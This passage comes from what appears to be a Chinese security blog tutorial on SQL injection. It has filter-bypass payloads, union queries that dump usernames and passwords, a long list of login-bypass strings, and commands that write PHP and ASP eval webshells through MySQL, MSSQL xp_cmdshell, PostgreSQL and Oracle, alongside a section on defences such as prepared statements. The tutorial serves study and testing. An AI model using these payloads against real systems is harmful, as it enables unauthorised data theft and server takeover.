+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719727906327-5ca499f2-4f3c-4d6d-a4d4-e0c89164045d.png"></p>
+<p>解决方法：</p>
+<ol>
+<li>使用大写绕过（将被过滤的字符改为大写字符）</li>
+</ol>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719727987635-1da6d698-5153-4715-8dcc-163b654b21df.png"></p>
+<h2 id="函数被过滤"><a href="#函数被过滤" class="headerlink" title="函数被过滤"></a>函数被过滤</h2><p>database()被过滤</p>
+<p>我们更改为大写DATABASE()发现也不能绕过，因为它是对整体database()进行过滤</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719728219359-5f9587ff-0e6f-4535-a154-13a5a6c64804.png"></p>
+<p>解决方法：</p>
+<ol>
+<li>注释绕过</li>
+</ol>
+<p>database&#x2F;**&#x2F;()</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719728294785-3e58f5c9-bc7d-4bb4-bfd2-51b7bef92dad.png"></p>
+<h2 id="注释符被过滤"><a href="#注释符被过滤" class="headerlink" title="注释符被过滤"></a>注释符被过滤</h2><p>当我们使用单引号闭合时，我们发现仍显示没有单引号闭合</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719926893280-0da50528-598f-4ae1-ad1a-7b09216e9153.png"></p>
+<p>解决方法：</p>
+<p>使用万能公式1’ and ‘1’&#x3D;’1，在and前构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">判断列数：</span><br><span class="line">?id=-1&#x27;  union select 1,2,3 and &#x27;1&#x27;=&#x27;1</span><br><span class="line">我们可以依次增加联合查询的字段数来判断列数</span><br><span class="line"></span><br><span class="line">获取表名</span><br><span class="line">?id=-1&#x27;  union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3 and &#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">获取列名</span><br><span class="line">?id=-1&#x27;  union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),3 and &#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">获取具体数据</span><br><span class="line">?id=-1&#x27;  union select 1,(select group_concat(username,&#x27;.&#x27;,password) from users),3 and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<h2 id="单引号被过滤"><a href="#单引号被过滤" class="headerlink" title="单引号被过滤"></a>单引号被过滤</h2><p>使用十六进制编码（HEX）编码内容，前面再加上0x<br>SQL注入语句中用单引号就不要编码，编码就不用单引号（路径，表名，数据库名等）</p>
+<blockquote>
+<p>sql文件读取时可以也编码路径</p>
+</blockquote>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731939171760-91c70200-23d3-45c7-ac71-d6cd439360d1.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731939171668-a3d198ba-2594-400a-addc-56c7ff95ebd2.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731939171582-d5e4502b-3707-4ad6-8ac1-08c8d73433fd.png"></p>
+<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><ol>
+<li>对用户输入内容进行过滤</li>
+<li>预编译</li>
+<li>最小权限原则：对于数据库用户要被授予最小权限，避免使用超级用户连接数据库</li>
+<li>错误信息处理限制：返回错误信息时应该设置一个固定的错误信息，避免攻击者通过错误信息获取更多的信息</li>
+</ol>
+<p><strong>预编译为何能够防御SQL注入</strong></p>
+<ol>
+<li><p>分离SQL代码与数据<br>预编译将SQL语句的结构与用户输入的数据分开处理。SQL语句的模板在预编译时固定，用户输入的数据随后以参数形式绑定，确保数据不会被解释为SQL代码。</p>
+</li>
+<li><p>参数化查询<br>预编译使用参数化查询，用户输入的数据作为参数传递，数据库不会将其视为SQL语句的一部分，从而避免了恶意输入改变SQL逻辑。</p>
+</li>
+<li><p>自动转义<br>预编译时，数据库驱动会自动对参数进行转义，确保特殊字符（如单引号）不会被误解为SQL语法的一部分。</p>
+</li>
+<li><p>防止恶意输入<br>由于用户输入被视为数据而非代码，恶意输入无法破坏SQL语句的结构，从而防止了SQL注入攻击。</p>
+</li>
+</ol>
+<p>示例</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 非预编译（易受SQL注入）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;user_input&#x27;</span>;</span><br><span class="line"><span class="comment">-- 预编译（防止SQL注入）</span></span><br><span class="line"><span class="keyword">PREPARE</span> stmt <span class="keyword">FROM</span> <span class="string">&#x27;SELECT * FROM users WHERE username = ?&#x27;</span>;</span><br><span class="line"><span class="keyword">EXECUTE</span> stmt <span class="keyword">USING</span> <span class="string">&#x27;user_input&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>总结<br>预编译通过分离SQL代码与数据、使用参数化查询和自动转义，有效防止了SQL注入攻击。</p>
+<h1 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h1><h2 id="万能密码登录"><a href="#万能密码登录" class="headerlink" title="万能密码登录"></a>万能密码登录</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; or 1=1#</span><br><span class="line">&#x27; or 1=&#x27;1</span><br><span class="line">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line">admin</span><br><span class="line">admin&#x27;--</span><br><span class="line">admin&#x27; or 4=4--</span><br><span class="line">admin&#x27; or &#x27;1&#x27;=&#x27;1&#x27;--</span><br><span class="line">admin888</span><br><span class="line">&quot;or &quot;a&quot;=&quot;a</span><br><span class="line">admin&#x27; or 2=2#</span><br><span class="line">a&#x27; having 1=1#</span><br><span class="line">a&#x27; having 1=1--</span><br><span class="line">admin&#x27; or &#x27;2&#x27;=&#x27;2</span><br><span class="line">&#x27;)or(&#x27;a&#x27;=&#x27;a</span><br><span class="line">or 4=4--</span><br><span class="line">c</span><br><span class="line">a&#x27;or&#x27; 4=4--</span><br><span class="line">&quot;or 4=4--</span><br><span class="line">&#x27;or&#x27;a&#x27;=&#x27;a</span><br><span class="line">&quot;or&quot;=&quot;a&#x27;=&#x27;a</span><br><span class="line">&#x27;or&#x27;&#x27;=&#x27;</span><br><span class="line">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line">1 or &#x27;1&#x27;=&#x27;1&#x27;=1</span><br><span class="line">1 or &#x27;1&#x27;=&#x27;1&#x27; or 4=4</span><br><span class="line">&#x27;OR 4=4%00</span><br><span class="line">&quot;or 4=4%00</span><br><span class="line">&#x27;xor</span><br><span class="line">admin&#x27; UNION Select 1,1,1 FROM admin Where &#x27;&#x27;=&#x27;</span><br><span class="line">1</span><br><span class="line">-1%cf&#x27; union select 1,1,1 as password,1,1,1 %23</span><br><span class="line">1</span><br><span class="line">17..admin&#x27; or &#x27;a&#x27;=&#x27;a 密码随便</span><br><span class="line">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line">&#x27;or 4=4/*</span><br><span class="line">something</span><br><span class="line">&#x27; OR &#x27;1&#x27;=&#x27;1</span><br><span class="line">1&#x27;or&#x27;1&#x27;=&#x27;1</span><br><span class="line">admin&#x27; OR 4=4/*</span><br><span class="line">1&#x27;or&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<h2 id="常见head头注入"><a href="#常见head头注入" class="headerlink" title="常见head头注入"></a>常见head头注入</h2><p>常见的HTTP注入点产生位置为【Referer】、【X-Forwarded-For】、【Cookie】、【X-Real-IP】、【Accept-Language】、【Authorization】</p>
+<p>(1)HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。</p>
+<p>(2)X-Forwarded-For:简称XFF头，它代表客户端，用于记录代理信息的，每经过一级代理(匿名代理除外)，代理服务器都会把这次请求的来源IP追加在X-Forwarded-For中</p>
+<p>(3)Cookie，有时也用其复数形式 Cookies，指某些网站为了辨别用户身份、进行 session 跟踪而储存在用户本地终端上的数据（通常经过加密）</p>
+<p>(4)X-Real-IP一般只记录真实发出请求的客户端IP，看下面的例子，</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: 1.1.1.1, 2.2.2.2, 3.3.3.3</span><br><span class="line">　　代表 请求由1.1.1.1发出，经过三层代理，第一层是2.2.2.2，第二层是3.3.3.3，而本次请求的来源IP4.4.4.4是第三层代理</span><br><span class="line">   如果配置了X-Read-IP，将会是：</span><br><span class="line">　　X-Real-IP: 1.1.1.1</span><br><span class="line">　　所以 ，如果只有一层代理，这两个头的值就是一样的</span><br></pre></td></tr></table></figure>
+
+<p>(5)Accept-Language请求头允许客户端声明它可以理解的自然语言,以及优先选择的区域方言</p>
+<h2 id="如果屏蔽了错误信息显示，如何判断是否存在注入"><a href="#如果屏蔽了错误信息显示，如何判断是否存在注入" class="headerlink" title="如果屏蔽了错误信息显示，如何判断是否存在注入"></a>如果屏蔽了错误信息显示，如何判断是否存在注入</h2><p>如果用户屏蔽了异常信息的显示我们就无法直接通过页面信息确认是否是注入，但是我们可以通过后端响应的状态码来确定是否是注入点，如果返回的状态码为<code>500</code>，那么我们就可以初步的判定<code>user</code>参数存在注入了。</p>
+<h2 id="写shell条件"><a href="#写shell条件" class="headerlink" title="写shell条件"></a>写shell条件</h2><p>在 SQL 注入（SQLi）中，<strong>写 WebShell</strong> 的前提是数据库具有<strong>写入文件的权限</strong>，并且目标环境支持解析<strong>可执行脚本</strong>（如 PHP、ASP、JSP）。一般来说，写 shell 的条件可以归纳如下：  </p>
+<hr>
+<p><strong>1. 目标数据库必须支持写文件</strong></p>
+<p>不同数据库写文件的方式不同，必须满足以下条件：</p>
+<ul>
+<li><strong>MySQL</strong>：需要 <code>FILE</code> 权限，可使用 <code>SELECT ... INTO OUTFILE</code></li>
+<li><strong>MSSQL</strong>：需要 <code>xp_cmdshell</code>、<code>BULK INSERT</code> 或 <code>OPENROWSET</code></li>
+<li><strong>PostgreSQL</strong>：支持 <code>COPY ... TO</code> 直接写入</li>
+<li><strong>Oracle</strong>：可用 <code>UTL_FILE</code> 写入，但需要权限</li>
+</ul>
+<hr>
+<p><strong>2. Web 目录必须可写</strong></p>
+<ul>
+<li>目标数据库可以写入的路径，<strong>必须在 Web 目录下</strong>（如 <code>/var/www/html/</code>）。</li>
+<li>可能需要找到可写目录：<ul>
+<li><strong>Windows</strong>：<code>C:\inetpub\wwwroot\</code>、<code>C:\xampp\htdocs\</code></li>
+<li><strong>Linux</strong>：<code>/var/www/html/</code>、<code>/usr/local/apache/htdocs/</code></li>
+</ul>
+</li>
+</ul>
+<p>如果数据库用户没有<strong>写入 Web 目录的权限</strong>，写 Shell 会失败。</p>
+<hr>
+<p><strong>3. 目标环境能解析 WebShell</strong></p>
+<ul>
+<li><strong>PHP 环境</strong>（Apache、Nginx）：可以写入 <code>.php</code> 文件。</li>
+<li><strong>ASP&#x2F;ASP.NET 环境</strong>（IIS）：可以写入 <code>.asp</code> 或 <code>.aspx</code> 文件。</li>
+<li><strong>JSP 环境</strong>（Tomcat、Jboss）：可以写入 <code>.jsp</code> 文件。</li>
+</ul>
+<p>如果写入 <code>.txt</code>、<code>.log</code> 等，Web 服务器不会执行，而是作为普通文件下载。</p>
+<hr>
+<p><strong>4. 具体的 SQL 注入写 Shell 方法</strong></p>
+<p><strong>1）MySQL 写 Shell</strong></p>
+<p><strong>条件：</strong></p>
+<ul>
+<li>需要 <code>FILE</code> 权限</li>
+<li>服务器开启 <code>secure_file_priv=&#39;&#39;</code>（或指向可写目录）</li>
+</ul>
+<p><strong>利用 <code>INTO OUTFILE</code>：</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> &quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]); ?&gt;&quot; <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><strong>利用 <code>LOAD DATA INFILE</code>：</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">LOAD DATA INFILE <span class="string">&#x27;/tmp/shell.txt&#x27;</span> <span class="keyword">INTO</span> <span class="keyword">TABLE</span> shell;</span><br></pre></td></tr></table></figure>
+
+<p><strong>限制：</strong></p>
+<ul>
+<li><code>secure_file_priv</code> 可能限制写入路径</li>
+<li>目标环境可能禁用了 <code>INTO OUTFILE</code></li>
+</ul>
+<hr>
+<p><strong>2）MSSQL 写 Shell</strong></p>
+<p><strong>条件：</strong></p>
+<ul>
+<li>需要 <code>xp_cmdshell</code> 开启（默认关闭）</li>
+<li>IIS 允许解析 <code>.asp</code> 或 <code>.aspx</code></li>
+</ul>
+<p><strong>开启 <code>xp_cmdshell</code>（如果被禁用）：</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>; RECONFIGURE;</span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="number">1</span>; RECONFIGURE;</span><br></pre></td></tr></table></figure>
+
+<p><strong>使用 <code>echo</code> 写入 ASP Shell：</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;echo &lt;%eval request(&quot;cmd&quot;)%&gt; &gt; C:\inetpub\wwwroot\shell.asp&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><strong>使用 <code>bcp</code> 方式写入：</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;bcp &quot;echo &lt;%eval request(&quot;cmd&quot;)%&gt;&quot; queryout C:\inetpub\wwwroot\shell.asp -c&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><strong>3）PostgreSQL 写 Shell</strong></p>
+<p><strong>条件：</strong></p>
+<ul>
+<li><code>COPY</code> 语句需要 <code>superuser</code> 权限</li>
+<li>目标 Web 目录可写</li>
+</ul>
+<p><strong>使用 <code>COPY</code> 写入 WebShell：</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">COPY</span> (<span class="keyword">SELECT</span> <span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]); ?&gt;&#x27;</span>) <span class="keyword">TO</span> <span class="string">&#x27;/var/www/html/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><strong>如果 <code>COPY</code> 被限制，可以用 <code>lo_export</code>：</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> lo_export(oid, <span class="string">&#x27;/var/www/html/shell.php&#x27;</span>) <span class="keyword">FROM</span> pg_largeobject;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><strong>4）Oracle 写 Shell</strong></p>
+<p><strong>条件：</strong></p>
+<ul>
+<li><code>UTL_FILE</code> 需要写入权限</li>
+<li>需要 DBA 级别的权限</li>
+</ul>
+<p><strong>写入 WebShell：</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span></span><br><span class="line">  f UTL_FILE.FILE_TYPE;</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">  f :<span class="operator">=</span> UTL_FILE.FOPEN(<span class="string">&#x27;/var/www/html/&#x27;</span>, <span class="string">&#x27;shell.php&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">  UTL_FILE.PUT_LINE(f, <span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]); ?&gt;&#x27;</span>);</span><br><span class="line">  UTL_FILE.FCLOSE(f);</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line"><span class="operator">/</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><strong>5. 其他方法</strong></p>
+<p><strong>1）日志文件写入 WebShell</strong></p>
+<p>如果数据库本身<strong>没有写文件权限</strong>，但日志文件<strong>可控并且可执行</strong>，可以通过 <strong>日志注入</strong> 方式写入 WebShell。</p>
+<p><strong>方法：修改 MySQL 日志</strong></p>
+<p><strong>开启 general_log 并写入 Shell</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">global</span> general_log <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">global</span> general_log_file <span class="operator">=</span> &quot;/var/www/html/shell.php&quot;;</span><br><span class="line"><span class="keyword">SELECT</span> &quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]); ?&gt;&quot;;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><strong>2）内存 UDF（User Defined Function）提权</strong></p>
+<p>如果数据库<strong>不能直接写文件</strong>，但可以执行动态链接库（DLL），可以：</p>
+<ul>
+<li><strong>上传 UDF</strong> 到数据库目录</li>
+<li><strong>创建自定义函数</strong> 调用 Shell</li>
+</ul>
+<p><strong>MSSQL 提权</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> exec_cmd(<span class="variable">@cmd</span> NVARCHAR(<span class="number">4000</span>)) <span class="keyword">RETURNS</span> <span class="type">INT</span> <span class="keyword">AS</span> <span class="keyword">EXTERNAL</span> NAME [dbo.xp_cmdshell];</span><br><span class="line"><span class="keyword">SELECT</span> exec_cmd(<span class="string">&#x27;whoami&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><strong>6. 绕过安全限制</strong></p>
+<p><strong>1）绕过 <code>secure_file_priv</code></strong></p>
+<p>如果 MySQL 限制 <code>secure_file_priv</code>：</p>
+<ul>
+<li><p><strong>查看当前限制路径</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;secure_file_priv&#x27;</span>;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>寻找 Web 目录是否可写</strong></p>
+<ul>
+<li><code>/tmp/</code></li>
+<li><code>/var/www/html/</code></li>
+<li><code>C:\xampp\htdocs\</code></li>
+</ul>
+</li>
+</ul>
+<p><strong>2）绕过 <code>xp_cmdshell</code> 限制</strong></p>
+<p>如果 <code>xp_cmdshell</code> 被禁用：</p>
+<ul>
+<li><p><strong>尝试 SQL Server Job</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> msdb.dbo.sp_add_job <span class="variable">@job_name</span><span class="operator">=</span><span class="string">&#x27;testjob&#x27;</span>;</span><br><span class="line"><span class="keyword">EXEC</span> msdb.dbo.sp_add_jobstep <span class="variable">@job_name</span><span class="operator">=</span><span class="string">&#x27;testjob&#x27;</span>, <span class="variable">@command</span><span class="operator">=</span><span class="string">&#x27;cmd /c whoami&#x27;</span>, <span class="variable">@step_id</span><span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"><span class="keyword">EXEC</span> msdb.dbo.sp_start_job <span class="variable">@job_name</span><span class="operator">=</span><span class="string">&#x27;testjob&#x27;</span>;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><strong>3）绕过 <code>open_basedir</code> 限制</strong></p>
+<p>如果 PHP <strong><code>open_basedir</code></strong> 限制文件访问：</p>
+<ul>
+<li><p>尝试 <strong><code>phar://</code></strong> 伪协议</p>
+</li>
+<li><p>上传 <code>.htaccess</code> 解除限制</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">php_flag</span> engine <span class="literal">on</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<hr>
+<p><strong>7. 关键防御措施</strong></p>
+<ul>
+<li><strong>禁用 <code>INTO OUTFILE</code></strong></li>
+<li><strong>限制 <code>secure_file_priv</code></strong></li>
+<li><strong>禁用 <code>xp_cmdshell</code></strong></li>
+<li><strong>最小化数据库用户权限</strong></li>
+<li><strong>Web 目录禁止写入</strong></li>
+<li><strong>日志监控 SQL 注入行为</strong></li>
+</ul>
+<hr>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h3><p>✅ <strong>SQL 注入写 Shell 的核心条件</strong>：</p>
+<ol>
+<li><strong>数据库支持写文件</strong></li>
+<li><strong>Web 目录可写</strong></li>
+<li><strong>Web 服务器解析 Shell</strong></li>
+<li><strong>绕过数据库和系统的安全限制</strong></li>
+</ol>
+<p>✅ <strong>不同数据库的写 Shell 方法</strong>：</p>
+<table>
+<thead>
+<tr>
+<th>数据库</th>
+<th>写入方式</th>
+<th>适用环境</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>MySQL</td>
+<td><code>INTO OUTFILE</code> &#x2F; <code>LOAD DATA</code></td>
+<td>需 <code>FILE</code> 权限</td>
+</tr>
+<tr>
+<td>MSSQL</td>
+<td><code>xp_cmdshell</code> &#x2F; <code>bcp</code></td>
+<td>需 <code>sysadmin</code> 权限</td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td><code>COPY TO</code></td>
+<td>需 <code>superuser</code></td>
+</tr>
+<tr>
+<td>Oracle</td>
+<td><code>UTL_FILE</code></td>
+<td>需 DBA 级别权限</td>
+</tr>
+</tbody></table>
+<p>✅ <strong>特殊绕过方式</strong>：</p>
+<ul>
+<li><strong>日志文件注入</strong></li>
+<li><strong>内存 UDF 提权</strong></li>
+<li><strong>时间盲注写入</strong></li>
+</ul>
+<p>如果数据库配置严格，SQLi <strong>直接写 Shell 难度较大</strong>，但可以结合<strong>文件包含漏洞</strong>或<strong>日志注入</strong>绕过限制。</p>
+</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">Attackxu</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://example.com/2025/05/27/SQL/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://example.com/2025/05/27/SQL/')">SQL</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"><div class="post-reward" onclick="anzhiyu.addRewardMask()"><div class="reward-button button--animated" title="赞赏作者"><i class="anzhiyufont anzhiyu-icon-hand-heart-fill"></i>打赏作者</div><div class="reward-main"><div class="reward-all"><span class="reward-title">感谢你赐予我前进的力量</span><ul class="reward-group"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul><a class="reward-main-btn" href="/about/#about-reward" target="_blank"><div class="reward-text">赞赏者名单</div><div class="reward-dec">因为你们的支持让我意识到写文章的价值🙏</div></a></div></div></div><div id="quit-box" onclick="anzhiyu.removeRewardMask()" style="display: none"></div></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://example.com/2025/05/27/SQL/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=SQL&amp;url=http://example.com/2025/05/27/SQL/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
+  var currentPageUrl = window.location.href;
+  var input = document.createElement("input");
+  input.setAttribute("value", currentPageUrl);
+  document.body.appendChild(input);
+  input.select();
+  input.setSelectionRange(0, 99999);
+  document.execCommand("copy");
+  document.body.removeChild(input);
+}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Attackxu の Blog</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/sql%E6%B3%A8%E5%85%A5/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>sql注入<span class="tagsPageCount">2</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/05/27/vulfocus%E9%9D%B6%E6%9C%BA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E9%83%A8%E7%BD%B2/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">vulfocus靶机环境搭建部署</div></div></a></div><div class="next-post pull-right"><a href="/2025/05/27/%E5%9F%BA%E4%BA%8Exss-lab%E7%9A%84%E7%BB%95%E8%BF%87/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div 